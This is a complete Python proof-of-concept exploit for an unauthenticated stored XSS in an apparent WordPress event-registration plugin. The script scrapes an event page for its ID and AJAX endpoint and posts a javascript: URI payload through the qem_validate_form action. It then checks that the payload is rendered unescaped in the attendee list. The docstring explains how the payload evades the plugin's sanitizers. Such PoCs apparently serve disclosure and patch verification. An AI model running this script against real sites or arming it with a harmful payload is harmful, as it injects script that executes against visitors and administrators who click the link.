#!/usr/bin/env python3
"""
PoC for Unauthenticated Stored XSS via yourblank1.
Attacker just runs: python3 poc.py --url=<event post/page URL>

Chain:
  POST admin-ajax.php?action=qem_validate_form (id, yourname, youremail, yourblank1)
  -> stored in wp_option qem_messages_<id>
  -> rendered unescaped in attendee list (<a href="...">) when
     Registration > "Show attendees as a list [listnames]" is enabled.

Payload uses javascript: URI so it survives both sanitizers on all PHP versions:
  sanitize_textarea_field() preserves it (no '<') and
  filter_var(..., FILTER_SANITIZE_STRING) preserves it (no tags/quotes).
  The classic '" autofocus...' breakout is encoded to &#34; on PHP 8.1+,
  so javascript: (click-required) is the reliable PoC.
"""

import argparse
import random
import re
import string
import sys
from urllib.parse import urlparse, urlunparse

try:
    import requests
except ImportError:
    sys.exit("[-] Missing dependency: pip install requests")


def rand_str(n=8):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def get_ajax_url(page_url, html=None):
    # ajax endpoint is <site-url>/wp-admin/admin-ajax.php (site-url includes subdir e.g. /wordpress).
    # Try to extract explicit ajaxurl from page HTML first (most reliable).
    if html:
        m = re.search(r"""ajaxurl\s*=\s*['"]([^'"]+admin-ajax\.php)['"]""", html)
        if m:
            return m.group(1)
    # Fallback: derive site root from api.w.org link or page base
    if html:
        m2 = re.search(r"""<link[^>]+rel=["']https://api\.w\.org/["'][^>]*href=["']([^"']+)/wp-json/["']""", html)
        if m2:
            return m2.group(1).rstrip("/") + "/wp-admin/admin-ajax.php"
    # Last resort: assume WP installed at first path segment of page_url
    # e.g. http://host/wordpress/event/poc/ -> http://host/wordpress/wp-admin/admin-ajax.php
    p = urlparse(page_url)
    parts = p.path.strip("/").split("/")
    # page_url like /wordpress/event/poc -> site subdir is everything before /event/
    # generic heuristic: drop last 2 segments if they look like CPT/slug
    base_path = ""
    if len(parts) >= 3:
        # keep first segment as subdir (covers /wordpress/...)
        base_path = "/" + parts[0]
    root = urlunparse((p.scheme, p.netloc, base_path, "", "", ""))
    return root.rstrip("/") + "/wp-admin/admin-ajax.php"


def extract_event_id(html):
    # Form renders: <form ... id="<postID>"> + <input type="hidden" name="id" value="<postID>" />
    m = re.search(r'name="id"\s+value="(\d+)"', html)
    if m:
        return m.group(1)
    m = re.search(r'<form[^>]*\sid="(\d+)"', html)
    if m:
        return m.group(1)
    return None


def main():
    ap = argparse.ArgumentParser(description="Quick Event Manager Stored XSS PoC")
    ap.add_argument("--url", required=True, help="URL of event post/page with registration form")
    args = ap.parse_args()
    page_url = args.url.rstrip("/")

    sess = requests.Session()
    sess.headers.update({"User-Agent": "Mozilla/5.0 QEM-PoC"})

    print(f"[*] GET {page_url}")
    r = sess.get(page_url, timeout=20)
    if r.status_code != 200:
        sys.exit(f"[-] GET failed: HTTP {r.status_code}")

    event_id = extract_event_id(r.text)
    if not event_id:
        sys.exit("[-] Could not find event id (hidden input name=\"id\"). "
                 "Make sure --url points to a single event page with [qem] registration form.")
    print(f"[+] event id = {event_id}")

    ajax_url = get_ajax_url(page_url, r.text)
    print(f"[*] ajax endpoint = {ajax_url}")

    marker = rand_str(6)
    attacker_name = f"attacker_{marker}"
    attacker_email = f"attacker_{marker}@example.com"
    # Reliable payload on WP 7.x + PHP 7.4/8.x (no quotes, no angle brackets)
    payload = "javascript:alert(document.domain)"
    print(f"[*] payload (yourblank1) = {payload}")

    data = {
        "action": "qem_validate_form",
        "id": event_id,
        "yourname": attacker_name,
        "youremail": attacker_email,
        "yourplaces": "1",
        "yourtelephone": "",
        "yourmessage": "",
        "yourblank1": payload,   # <-- vulnerable field, also sent even if "User defined 1" hidden
        "yourblank2": "",
        "validator": "",         # honeypot must stay empty
        "ipn": "",
    }

    print(f"[*] POST {ajax_url} action=qem_validate_form as unauthenticated user")
    pr = sess.post(ajax_url, data=data, timeout=20)
    print(f"[*] POST status = {pr.status_code}")
    try:
        j = pr.json()
        print(f"[*] json success={j.get('success')} errors={j.get('errors')}")
        if j.get("errors"):
            print("[-] validation errors (event may require captcha / be full / moderate on). "
                  "Try another event with default registration settings.")
    except Exception:
        print("[*] (non-JSON response, continuing to verification step)")

    print(f"[*] Re-GET {page_url} to verify storage")
    vr = sess.get(page_url, timeout=20)
    if payload in vr.text:
        # Show the vulnerable sink context
        idx = vr.text.find(payload)
        ctx = vr.text[max(0, idx - 120): idx + 120].replace("\n", " ")
        print(f"[+] STORED! payload reflected in event page:")
        print(f"    ...{ctx}...")
        if f'<a href="{payload}"' in vr.text:
            print(f"[+] Vulnerable sink confirmed: <a href=\"{payload}\"> (no esc_url/esc_attr)")
        print("[+] Impact: any visitor (incl. admin) viewing the attendee list gets the link; "
              "clicking it executes JS in site origin.")
        print(f"[+] Registered as: {attacker_name} / {attacker_email} (use a fresh email per run)")
    else:
        print("[-] Payload NOT found in page. Possible causes:")
        print("    1) Admin has NOT enabled Registration > 'Show attendees as a list [listnames]'")
        print("       (default OFF -> vulnerable branch not rendered).")
        print("    2) Registration moderated / captcha / event full / duplicate email blocked.")
        print("    3) listblurb template does not contain [website] (default does).")


if __name__ == "__main__":
    main()
